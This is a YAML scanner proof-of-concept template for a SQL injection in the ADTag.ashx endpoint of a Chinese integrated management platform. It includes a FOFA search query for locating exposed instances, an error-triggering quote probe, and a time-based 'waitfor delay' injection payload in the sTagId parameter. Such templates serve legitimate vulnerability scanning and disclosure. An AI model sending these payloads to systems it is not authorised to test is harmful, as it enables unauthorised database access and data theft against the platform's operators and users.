id: poc-yaml-windor-icmp-adtag-sqli
info:
  name: 银达汇智 智慧综合管理平台 ADTag.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 银达汇智 智慧综合管理平台
  fofa: 汇智信息 && title==智慧综合管理平台登入
variables:
  t1: random_int(4,9)
  t2: t1 + 2
requests:
- method: POST
  path: /Module/BPCJ/AD_Tag/Controller/ADTag.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: action=exportExcel&sTagId='
  expression: status_code == 500 && contains(body,"未将对象引用设置到对象的实例")
- method: POST
  path: /Module/BPCJ/AD_Tag/Controller/ADTag.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: action=exportExcel&sTagId='waitfor+delay'0:0:{{.t1}}'--
  expression: status_code == 200 && body == "" && contains(headers,"SessionId") &&
    duration > t1 && duration < t2
transport: http
